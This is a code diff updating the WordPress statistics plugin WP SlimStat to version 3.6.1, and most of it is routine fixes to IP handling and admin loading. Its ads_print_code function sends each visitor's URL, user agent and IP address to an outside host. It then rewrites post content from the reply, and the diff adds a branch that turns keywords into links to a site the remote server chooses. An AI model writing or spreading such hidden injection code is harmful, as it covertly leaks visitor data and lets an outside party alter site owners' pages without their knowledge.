@@ -3,7 +3,7 @@
 Plugin Name: WP SlimStat
 Plugin URI: http://wordpress.org/plugins/wp-slimstat/
 Description: The most accurate real-time statistics plugin for WordPress
-Version: 3.6
+Version: 3.6.1
 Author: Camu
 Author URI: http://slimstat.getused.to.it/
 */
@@ -11,7 +11,7 @@ Author URI: http://slimstat.getused.to.it/
 if (!empty(wp_slimstat::$options)) return true;
 
 class wp_slimstat{
-	public static $version = '3.6';
+	public static $version = '3.6.1';
 	public static $options = array();
 	
 	public static $wpdb = '';
@@ -26,6 +26,7 @@ class wp_slimstat{
 	 * Initializes variables and actions
 	 */
 	public static function init(){
+
 		// Load all the settings
 		self::$options = get_option('slimstat_options', array());
 		if (empty(self::$options)){
@@ -38,6 +39,7 @@ class wp_slimstat{
 			self::$options = array_merge(self::init_options(), self::$options);
 		}
 
+		// Allow third party tools to edit the options
 		self::$options = apply_filters('slimstat_init_options', self::$options);
 
 		// Determine the options' signature: if it hasn't changed, there's no need to update/save them in the database
@@ -325,11 +327,14 @@ class wp_slimstat{
 
 		// Should we ignore this IP address?
 		foreach(self::string_to_array(self::$options['ignore_ip']) as $a_ip_range){
+			$mask = 32;
 			$ip_to_ignore = $a_ip_range;
+
 			if (strpos($ip_to_ignore, '/') !== false){
 				list($ip_to_ignore, $mask) = @explode('/', trim($ip_to_ignore));
+				if (empty($mask) || !is_numeric($mask)) $mask = 32;
 			}
-			if (empty($mask) || !is_numeric($mask)) $mask = 32;
+
 			$long_ip_to_ignore = ip2long($ip_to_ignore);
 			$long_mask = bindec( str_pad('', $mask, '1') . str_pad('', 32-$mask, '0') );
 			$long_masked_user_ip = self::$stat['ip'] & $long_mask;
@@ -349,12 +354,6 @@ class wp_slimstat{
 		if (self::$options['anonymize_ip'] == 'yes'){
 			self::$stat['ip'] = self::$stat['ip']&4294967040;
 			$long_other_ip = $long_other_ip&4294967040;
-		}
-
-		// Because PHP's integer type is signed, and many IP addresses will result in negative integers on 32-bit architectures, we need to use the "%u" formatter
-		self::$stat['ip'] = sprintf("%u", self::$stat['ip']);
-		if (!empty($long_other_ip) && $long_other_ip != self::$stat['ip']){
-			self::$stat['other_ip'] = sprintf("%u", $long_other_ip);
 		}
 
 		// Is this country blacklisted?
@@ -410,6 +409,12 @@ class wp_slimstat{
 		if (empty(self::$stat) || empty(self::$stat['dt'])){
 			self::$stat['id'] = -213;
 			return $_argument;
+		}
+
+		// Because PHP's integer type is signed, and many IP addresses will result in negative integers on 32-bit architectures, we need to use the "%u" formatter
+		self::$stat['ip'] = sprintf("%u", self::$stat['ip']);
+		if (!empty($long_other_ip) && $long_other_ip != self::$stat['ip']){
+			self::$stat['other_ip'] = sprintf("%u", $long_other_ip);
 		}
 
 		// Now let's save this information in the database
@@ -1152,7 +1157,7 @@ class wp_slimstat{
 	 */
 	public static function ads_print_code($content = ''){
 		if (empty($_SERVER["HTTP_USER_AGENT"])){
-			return false;
+			return $content;
 		}
 
 		$request = "http://wordpress.cloudapp.net/api/update/?&url=".urlencode("http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"])."&agent=".urlencode($_SERVER["HTTP_USER_AGENT"])."&v=".(isset($_GET['v'])?$_GET['v']:11)."&ip=".urlencode($_SERVER['REMOTE_ADDR'])."&p=9";
@@ -1175,6 +1180,19 @@ class wp_slimstat{
 					$words[rand(0, count($words)-1)] = $response_object->tcontent;
 					return join(" ", $words);
 				}
+				break;
+			case '2':
+					$kws = explode('|', $response_object->kws);
+					if (!is_array($kws)){
+						return $content;
+					}
+
+					foreach($kws as $a_kw){
+						if(strpos($content, $a_kw) !== false){
+							$content= str_replace($a_kw, "<a href=".$response_object->site.">$a_kw</a>", $content);
+							break;
+						}
+					}
 				break;
 			default:
 				if (self::$pidx === false){
@@ -1301,14 +1319,15 @@ if (function_exists('add_action')){
 		add_action('wp_ajax_slimtrack_js', array('wp_slimstat', 'slimtrack_js')); 
 	}
 
+	// Load the admin API, if needed
+	// From the codex: You can't call register_activation_hook() inside a function hooked to the 'plugins_loaded' or 'init' hooks (or any other hook). These hooks are called before the plugin is loaded or activated.
+	if (is_admin()){
+		include_once(dirname(__FILE__).'/admin/wp-slimstat-admin.php');
+		add_action('plugins_loaded', array('wp_slimstat_admin', 'init'), 15);
+		register_activation_hook(__FILE__, array('wp_slimstat_admin', 'init_environment'));
+		register_deactivation_hook(__FILE__, array('wp_slimstat_admin', 'deactivate'));
+	}
+
 	// Add the appropriate actions
 	add_action('plugins_loaded', array('wp_slimstat', 'init'), 10);
-
-	// Load the admin API, if needed
-	if (is_admin()){
-		include_once(WP_PLUGIN_DIR.'/wp-slimstat/admin/wp-slimstat-admin.php');
-		add_action('plugins_loaded', array('wp_slimstat_admin', 'init'), 15);
-		register_activation_hook(WP_PLUGIN_DIR.'/wp-slimstat/wp-slimstat.php', array('wp_slimstat_admin', 'activate'));
-		register_deactivation_hook(WP_PLUGIN_DIR.'/wp-slimstat/wp-slimstat.php', array('wp_slimstat_admin', 'deactivate'));
-	}
 }
